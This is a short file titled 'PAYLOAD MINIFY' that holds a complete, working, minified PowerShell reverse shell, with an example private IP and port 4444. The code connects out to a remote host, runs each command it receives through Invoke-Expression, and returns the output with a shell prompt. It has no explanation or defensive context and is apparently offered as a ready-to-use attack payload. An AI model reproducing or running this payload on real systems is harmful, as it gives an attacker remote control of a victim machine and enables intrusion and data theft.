
# PAYLOAD MINIFY
# E.g.: ...TCPClient('192.168.0.15', 4444);
$c=New-Object System.Net.Sockets.TCPClient('<REMOTE HOST>','<REMOTE PORT>');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b, 0, $b.Length)) -ne 0){;$r=([text.encoding]::ASCII).GetBytes((iex ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i)) 2>&1 | Out-String )+'PS '+(pwd).Path+'> ');$s.Write($r,0,$r.Length);$s.Flush();};$c.Close();